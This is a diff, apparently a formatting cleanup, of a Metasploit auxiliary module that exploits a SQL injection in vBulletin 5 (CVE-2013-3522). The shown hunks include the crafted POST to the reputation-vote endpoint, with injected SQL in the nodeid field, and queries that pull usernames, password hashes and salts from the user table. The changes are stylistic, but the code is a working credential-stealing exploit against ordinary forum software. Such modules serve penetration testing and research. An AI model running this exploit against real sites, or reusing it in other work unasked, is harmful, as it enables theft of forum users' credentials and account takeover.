@@ -8,31 +8,37 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'vBulletin Password Collector via nodeid SQL Injection',
-      'Description'    => %q{
-        This module exploits a SQL injection vulnerability found in vBulletin 5 that has been
-        used in the wild since March 2013. This module can be used to extract the web application's
-        usernames and hashes, which could be used to authenticate into the vBulletin admin control
-        panel.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'vBulletin Password Collector via nodeid SQL Injection',
+        'Description' => %q{
+          This module exploits a SQL injection vulnerability found in vBulletin 5 that has been
+          used in the wild since March 2013. This module can be used to extract the web application's
+          usernames and hashes, which could be used to authenticate into the vBulletin admin control
+          panel.
+        },
+        'References' => [
           [ 'CVE', '2013-3522' ],
           [ 'OSVDB', '92031' ],
           [ 'EDB', '24882' ],
           [ 'BID', '58754' ],
           [ 'URL', 'http://www.zempirians.com/archive/legion/vbulletin_5.pl.txt' ]
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Orestis Kourides', # Vulnerability discovery and PoC
           'sinn3r', # Metasploit module
           'juan vazquez' # Metasploit module
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2013-03-24'
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2013-03-24',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -40,7 +46,8 @@ class MetasploitModule < Msf::Auxiliary
         OptInt.new("NODE", [false, 'Valid Node ID']),
         OptInt.new("MINNODE", [true, 'Valid Node ID', 1]),
         OptInt.new("MAXNODE", [true, 'Valid Node ID', 100])
-      ])
+      ]
+    )
   end
 
   def exists_node?(id)
@@ -95,13 +102,13 @@ class MetasploitModule < Msf::Auxiliary
     injection << "AND (#{random_and}=#{random_and}"
 
     res = send_request_cgi({
-      'method'    => 'POST',
-      'uri'       => normalize_uri(target_uri.path, "index.php", "ajax", "api", "reputation", "vote"),
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, "index.php", "ajax", "api", "reputation", "vote"),
       'vars_post' =>
         {
-          'nodeid'  => "#{node}#{injection}",
+          'nodeid' => "#{node}#{injection}",
         }
-      })
+    })
 
     unless res and res.code == 200 and res.body.to_s =~ /Database error in vBulletin/
       return nil
@@ -117,9 +124,9 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_user_data(node_id, user_id)
-    user = do_sqli(node_id, "select username from user limit #{user_id},#{user_id+1}")
-    pass = do_sqli(node_id, "select password from user limit #{user_id},#{user_id+1}")
-    salt = do_sqli(node_id, "select salt from user limit #{user_id},#{user_id+1}")
+    user = do_sqli(node_id, "select username from user limit #{user_id},#{user_id + 1}")
+    pass = do_sqli(node_id, "select password from user limit #{user_id},#{user_id + 1}")
+    salt = do_sqli(node_id, "select salt from user limit #{user_id},#{user_id + 1}")
 
     return [user, pass, salt]
   end
@@ -187,8 +194,8 @@ class MetasploitModule < Msf::Auxiliary
     print_good("#{count_users} users found. Collecting credentials...")
 
     users_table = Rex::Text::Table.new(
-      'Header'  => 'vBulletin Users',
-      'Indent'   => 1,
+      'Header' => 'vBulletin Users',
+      'Indent' => 1,
       'Columns' => ['Username', 'Password Hash', 'Salt']
     )
 
@@ -215,6 +222,4 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
 end
-
